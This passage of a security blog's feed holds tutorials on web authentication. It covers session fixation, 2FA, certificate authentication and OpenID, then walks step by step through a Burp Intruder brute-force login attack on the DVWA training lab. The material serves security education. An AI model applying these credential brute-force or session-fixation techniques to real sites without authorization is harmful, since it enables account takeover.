+<p>There are various ways in which the attacker can steal the session of the victim. One of these methods is called a Session Fixation attack. In this attack, the attacker can control the session ID which a user will obtain once the user logs in to a particular website. He can do this by making the user click on a link with a specific session id, for e.g the url could be site.com?session_id=3ejn324n23j423n3 . Once the user logs in, he is given the session id "3ejn324n23j423n3". The attacker can now simply impersonate the victim by using the same Session ID. Note that this method will only work in cases when only the Session ID parameter is used to authenticate the victim. If some other parameter like the Ip-address, Mac address etc is used to validate the victim too, this method will not work. </p>
+
+
+
+
+<p>These kind of attacks can be prevented by using session ID's that are long, complex and are not easily predicatable. Also the session ID's should have a very large keyspace, which will make brute force attacks less likely to be successful.</p>
+
+
+
+
+<h2>Advanced Authentication Methods</h2>
+
+
+<p> With the increase in security awareness among people over the last few years, a number of new authentication methods have been deployed. In this section, we will be discussing some of the most popular ones.</p>
+
+
+
+
+<p><b class="small">a) Two-Factor Authentication</b>-A Two factor authentication involves the use of 2 different kinds of evidence to authenticate a person. Please note that these 2 different kinds of evidence should be completely independent of each other. These 2 factors can be defined in terms of <i> "Something you have"</i> and <i>"Something you know"</i>. An example of a two-factor authentication is a biometric authentication asking the users to provide their fingerprint and then asking them to enter their password. In this case the password goes under the category "Something you know" whereas the fingerprint goes under the category "Something you have". In some cases, hardware tokens are provided to the user as a second factor for authentication.However implementation and support for hardware tokens are very costly, and hence most banking companies do not support this. It would be better to atleast give the user an option to choose whether he wants to use two-factor authentication or not and then charge the amount from him in case he wants it.</p>
+
+
+
+
+<p>However there are other methods for providing two-factor authentication which are not that expensive. Use of One Time passwords is one such example. Some of the service providers ask the user to enter a One Time Password (OTP) each time the user logs in to use their service. This One Time Password is sent either via a text message or a voice call to their mobile phones. Hence the role of hardware tokens is now taken up by the user's mobile phone.Two-Factor Authentication is still vulnerable to Man in the Middle attacks, where an attacker can set up a malicious website and once the user enters his credentials, a request is made to the actual website via the attacker. If properly executed, the user will never know that he is not at the original site.</p>
+
+
+<p></p>
+
+<p><b class="small">b) Certificate Based Authentication</b>-Certificate Based Authentication is one of the most popular authentication methods used these days. It involves the use of a digital certificate to authenticate a user. Users are prompted to install a unique certificate on their system the first time the user uses a service. So when the user browses to that service again, the service will query the user PC for that unique certificate. If the certificate is valid, then the service will grant access to the user. In some cases, certificate based authentication is used with regular password based authentication method to provide a two-factor authentication which adds an extra layer of security. This is because the certificate is something that the user should have and the password is something that the user should know.</p>
+
+
+
+
+<p><b class="small">c) Open ID</b>- During the last few years, many websites have started delegating the responsibility of authentication to external authentication service providers. An example of this is the Windows Live ID which allows a user to sign onto multiple websites with the same account. However the most popular authentication service provider is Open ID. Once a user has an Open ID account, he can log on to all the websites that supports Open ID authentication using only one username/password combination.Open ID is supported by many popular websites like Google, Yahoo, Facebook, AOL etc. To create an Open ID we must register an account with an Open ID provider. Some of the popular Open ID providers are MyOpenId, Yahoo etc. It is an important to choose a good Open ID provider as they will be the ones managing our credentials.</p>
+
+
+
+
+<p>One thing to note that here is that only the Open ID provider can see our password and that the Open ID provider is responsible for communicating with the website and asking it to identify us as a valid user. Some security concerns have been raised in the past over the security that Open ID provides. The problem is, if your Open ID username/password is compromised by an attacker, then it can reveal your whole online information. The attacker can then log on to all the websites that you use with your Open ID. Hence the convenience caused by Open ID does come at a cost. More information about Open ID can be found <a href="http://openid.net/">here</a>.</p>
+
+
+
+
+<h2>Conclusion</h2>
+
+
+
+
+<p>In this article we looked at some of the advanced authentication techniques used these days, namely Two-Factor Authentication, Certificate Based Authentication and Open ID. We discussed the pros and cons of each of these techniques. We also discussed various methods of Bypassing authentication like SQL Injection, Cookie Stealing and Session Hijacking. No one method of authentication is the best, however using some of the advanced authentication methods will always decrease the chances of our personal information getting compromised.</p>
+
+
+
+
+<h2>References</h2>
+
+
+
+
+<ol>
+    <li><p>OpenID Foundation Website</br><a href="http://openid.net">http://openid.net</a></p></li>
+    <li><p>Two-Factor Authentication</br><a href="http://en.wikipedia.org/wiki/Two-factor_authentication">http://http://en.wikipedia.org/wiki/Two-factor_authentication</a></p></li>
+    <li><p>Session Hijacking attack</br><a href="https://www.owasp.org/index.php/Session_hijacking_attack">https://www.owasp.org/index.php/Session_hijacking_attack</a></p></li>
+    <li><p>HTTP Cookie</br><a href="http://en.wikipedia.org/wiki/HTTP_cookie">http://en.wikipedia.org/wiki/HTTP_cookie</a></p></li>
+    <li><p>Public Key Certificate</br><a href="http://en.wikipedia.org/wiki/Public_key_certificate">http://en.wikipedia.org/wiki/Public_key_certificate</a></p></li>
+    <li><p>Advanced sign-in security for your google account</br><a href="http://googleblog.blogspot.com/2011/02/advanced-sign-in-security-for-your.html">http://googleblog.blogspot.com/2011/02/advanced-sign-in-security-for-your.html</a></p></li>
+</ol>
+
+
+
+
+<p>This article was originally published on the <a href="http://resources.infosecinstitute.com/">resources</a> page at <a href="http://infosecinstitute.com/">Infosec Institute</a>. For more information, please visit my author <a href="http://resources.infosecinstitute.com/author/prateek/">page</a>.</p>
+
+
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Hacking Web Authentication – Part 1]]></title>
+    <link href="http://prateek147.github.io/2013/06/12/hacking-web-authentication-part-1"/>
+    <updated>2013-06-12T04:57:00+04:00</updated>
+    <id>http://prateek147.github.io/2013/06/12/hacking-web-authentication-part-1</id>
+    <content type="html"><![CDATA[<p>Authentication is the process of validating something as authentic. When a client makes a request to a web server for accessing a resource, sometimes the web server has to verify the user's identity. For that the user will have to supply some credentials and the web server validates it. All subsequent decisions are then taken on the basis of the credentials supplied by the client. This process is called Authentication. Once the user is authenticated, the web server sets up the appropriate permissions for the user on it's resources. Whenever the user tries to access a resource, the server will check if the user has appropriate permissions to access the resource or not. This process is called Authorization.In this article we will look at some of the common types of authentication used these days, discuss the vulnerabilities in them, and then move on to some attacks against these authentication types.</p>
+
+
+
+
+<!-- more -->
+
+
+
+
+<p>Please note that we will be using Burpsuite in this article for analyzing the requests sent through. Burpsuite is available by default in Backtrack. In order to intercept the requests and manipulate them, we must configure our browser to use Burp's proxy, which is 127.0.0.1:8080 by default. We will also be using Wireshark a bit.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/webauth1//1.png" width="617" height="562" alt="1"></p>
+
+<p>Once this is done, open up Burpsuite, go to Proxy-->Intercept and make sure Intercept is on.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/webauth1//2.png" width="1137" height="224" alt="2">
+˜</p>
+
+<p>Now go to the options tab and check to see if the proxy is listening on port 8080. Also make sure "Generate CA-signed per-host certificates" option is checked. Each time the user connects to a SSL protected website, Burpsuite will generate a server certificate for that host, signed by a unique CA certificate which is generated in Burpsuite during it's installation. The purpose of this is to reduce the SSL errors that occur because of the proxy in between.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/webauth1//3.png" width="1136" height="700" alt="3"></p>
+
+<p>Now that we have set up Burpsuite and the configurations in our browser properly, we can intercept requests. Please note that whenever you send a request, it will be intercepted by Burpsuite and you will have to forward it manually. Hence it is advisable to keep "intercept is on" option checked only when you really want to see the contents of the packets going through.</p>
+
+
+
+
+<h2>Types of Authentication</h2>
+
+
+
+
+<h3>1)HTTP-Basic Authentication</h3>
+
+
+
+
+<p>HTTP-Basic authentication uses a combination of a username and password to authenticate the user. The process starts when a user sends a GET request for a resource without providing any authentication credentials. The request is intercepted by Burpsuite and looks something like this.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/webauth1//4.png" width="1141" height="243" alt="4"></p>
+
+<p>The server responds back with a "Authorization Required" message in it's header.We can see the packet in Wireshark. As we can see from the header that the authentication is of the type "Basic". The browser is quick to recognize this and displays a popup to the user requesting for a Username and a Password. Note that the popup is displayed by the browser and not the web application.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/webauth1//5.png" width="1431" height="660" alt="5"></p>
+
+<p>Once we type in the username and password and intercept the request the request again using Burpsuite, we get something like this.The last line says "Authorization: Basic aW5mb3NlYzppbmZvc2VjaW5zdGl0dXRl". This is basically the extra thing being passed in the header now. The text after Basic holds the key. These are basically the credentials in encoded form.The username and password are concatenated with a colon (:) in between and the whole thing is then encoded using the Base64 algorithm. For example, if the username is "infosec" and the password is "infosecinstitute" then the whole thing "infosec:infosecinstitute" is encoded using the Base 64 algorithm.The server then gets the header value, decodes it to get the credentials and grants access to the user if the credentials are correct. The point to note here is that it is very trivial to decode the encoded string to obtain the credentials, hence it is widely vulnerable to eavesdropping attacks.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/webauth1//6.png" width="1140" height="236" alt="6"></p>
+
+<p>Wireshark is able to recognize this and automatically decodes the string to reveal the credentials as shown in the figure below.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/webauth1//7.png" width="1405" height="297" alt="7"></p>
+
+<p>As we can see from the Credentials sections, the username and password are "infosec" and "infosecinstitute" respectively. One of the problems with HTTP-Basic Authentication is that the data is being passed over in plaintext. This risk can be removed by using SSL, which will send the data in encrypted format, and hence the value in the Authorization header will not be visible. However it will be still be vulnerable to many client side attacks, including MITM. It is also vulnerable to Brute force attacks which we will see in the coming sections.</p>
+
+
+
+
+<h3>2)HTTP-Digest Authentication</h3>
+
+
+
+
+<p>Digest Authentication was designed as an improvement over Basic Authentication. One of the major improvements with it is that the data is not passed over in cleartext but in encrypted format. The user first makes a request to the Page without any credentials. The server replies back with a WWW-Authenticate header indicating that credentials are required to access the resource. The server also sends back a random value which is usually called a "nonce". The browser then uses a cryptographic function to create a message digest of the username, password, nonce, the HTTP methods, and the URL of the page. The cryptographic function used in this case is a one way function, meaning that the message digest can be created in one direction but cannot be reversed back to reveal the values that created it.By default, Digest authentication uses MD5 cryptographic hashing algorithm.</p>
+
+
+
+
+<p>Digest Access authentication is less vulnerable to Eavesdropping attacks than Basic authentication, but is still vulnerable to replay attacks, i.e if a client can replay the message digest created by the encryption, the server will allow access to the client. However to thwart this kind of attack, server nonce sometimes also contains timestamps. Once the server gets back the nonce, it checks its attributes and if the time duration is exceeded, it may reject the request from the client. One of the other good things about Digest access authentication is that the attacker will have to know all the other 4 values (username, nonce, url, http method) in order to carry out a Dictionary or a Brute force attack. This process is more computationally expensive than simple brute force attacks and also has a larger keyspace which makes brute force attack less likely to succeed.</p>
+
+
+
+
+<h3>3)Form Based Authentication</h3>
+
+
+
+
+<p>Form Based Authentication uses a form (usually in html) with input tags to allow users to enter their username and password. Once the user submits the information, it is passed over through either GET or POST methods via HTTP or HTTPs to the server. On the server side if the credentials are found to be correct, then the user is authenticated and some random token value or session id is given to the user for subsequent requests. One of the good features about Form Based authentication is that their is no standardized way of encoding or encrypting the username/password, and hence it is highly customizable which makes it immune to the common attacks which were successful against HTML Basic and Digest Authentication mechanisms. Form Based authentication is by far the most popular authentication method used in Web applications. Some of the issues with Form based authentication is that credentials are passed over in plaintext unless steps such as employment of TLS (Transport Layer Security) are not taken.</p>
+
+
+<p></p>
+
+<p>Let's see an example of Form based authentication. We will be using DVWA (Damn vulnerable web application) for our exercise as we will be using the same for carrying out a brute force attack against Form based authentication. DVWA can be downloaded from <a href="http://dvwa.co.uk/">here</a>.</p>
+
+
+
+
+<p>Once you have downloaded and installed it, login with the default credentials {admin/password} and click on the Brute Force tab on left side and click on View Source to view the source. Please note that the Security level is set to high in my case. As we can see the form accepts the username and password, validates it to remove any sort of special characters which could be used to perform SQL injection, and then sends it over to a sql query where the credentials are checked against the database to see if they are correct or not. </p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/webauth1//8.png" width="1291" height="708" alt="8"></p>
+
+<p>let's input any username/password and intercept the result using Burpsuite. Here is what it should look like in your case.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/webauth1//9.png" width="1139" height="249" alt="9"></p>
+
+<h2>Attacking Web Authentication</h2>
+
+
+
+
+<p>In this section we will be carrying out a bruteforce attack against form based authentication for Security level "High" in Dvwa. Please note that brute force attacks may not work in all cases. In some cases websites will start rejecting your requests after some specified number of unsuccessful tries. Also some websites may use CAPTCHA to validate if a human is indeed making the request or not.</p>
+
+
+
+
+<p>To carry out a brute force attack, we will be using the intruder feature in Burpsuite. Some of the things required for this attack are a list of common usernames and passwords. Go to the form and submit a request using any username/password for now, then intercept the request. Once you have the request, right click on it and click on "send to intruder"</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/webauth1//10.png" width="1136" height="604" alt="10"></p>
+
+<p>This will send the request information to the intruder. Go to the intruder tab. Now we will have to configure burpsuite to launch the brute force attack.Under the target tab, we can see that it has already set the target by looking at the request.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/webauth1//11.png" width="1136" height="206" alt="11"></p>
+
+<p>Go to the positions tab now, here we can see the request which we had previously sent to intruder. Some of the things are highlighted in the request. This is basically a guess by Burpsuite to figure out what all things will be changing with each request in a Brute force attack. Since in this case only username and password will be changing with each request, we need to configure Burp accordingly.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/webauth1//12.png" width="1122" height="293" alt="12"></p>
+
+<p>Click on the clear button on the right hand side. This will remove all the highlighted text, now we need to configure Burp to only set the username and password as the parameters for this attack. Highlight the username from this request (in this case "infosec") and click on Add. Similarly highlight the password from this request and click on Add. This will add the username and password as the first and second parameters. Once you are done, your output should look something like this.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/webauth1//13.png" width="1138" height="318" alt="13"></p>
+
+<p>The next thing we need to do is set the Attack type for this attack, which is found at the top of the request we just modified. By default it is set to Sniper. However in our case we will be using the Attack type "Cluster Bomb". For more details on which attack is suitable for which scenario, please read Burp's documentation. Basically the idea of cluster bomb is to use Multiple payload sets (1 for username and 1 for the password), the attack will start by trying all the values in Payload 1 with first value in Payload 2, then by trying all the values in Payload 1 with second value in Payload 2 and so on. As we can see from the image below, our attack type is set to "Cluster Bomb".</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/webauth1//14.png" width="1124" height="135" alt="14"></p>
+
+<p>Go to the payload tab, make sure payload set 1 is selected, click on load and load the file containing a list of usernames. In my case i am using a very small file just for demonstrations purposes. Once you load the file all the usernames will be displayed as shown in the image below.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/webauth1//15.png" width="1126" height="336" alt="15"></p>
+
+<p>Similarly select payload set 2, click on load and load the file containing a list of passwords.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/webauth1//16.png" width="1130" height="338" alt="16"></p>
+
+<p>Go to the options tab now and make sure "store requests"  and "store response" options are set under results. Have a look at all the options and see if you need or don't need any of these options. </p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/webauth1//17.png" width="1137" height="648" alt="17"></p>
+
+<p>All right we are now set to launch our attack. Click on intruder on the top left and click on "start attack". We will see a windows pop up with all the requests being made. So how do we know which request is successful. Usually a successful request will have a different response than an unsuccessful request or will have a different status response. In this case we see that the request with the username "admin" and the password "password" has a response of different length than the other responses.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/webauth1//18.png" width="1136" height="489" alt="18"></p>
+
+<p>Let's click on the request with a different length response. If we click on the response section, we see the text "Welcome to the password protected area admin" in the response. This confirms that the username/password used in this request is the correct one.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/webauth1//19.png" width="1144" height="675" alt="19"></p>
+
+<h2>Conclusion</h2>
+
+
+
+
+<p>In this article we discussed some of the common authentication methods used, the vulnerabilities in these authentication methods and then looked at different ways to attack them. However this is just a part of the story. In the recent years, many other authentication mechanisms have been developed, including use of "One Time passwords", "Digital Certificates" and use of external authentication service providers like Open ID. Several other attacks which have not been discussed in this article are Session Stealing, Cookie stealing, Cross Site Request Forgery and SQL Injection. We will be discussing all these in the next article.</p>
+
+
+
+
+<p>This article was originally published on the <a href="http://resources.infosecinstitute.com/">resources</a> page at <a href="http://infosecinstitute.com/">Infosec Institute</a>. For more information, please visit my author <a href="http://resources.infosecinstitute.com/author/prateek/">page</a>.</p>
+
+
+<p></body>
+</html></p>
+]]></content>
+  </entry>
+  
+</feed>
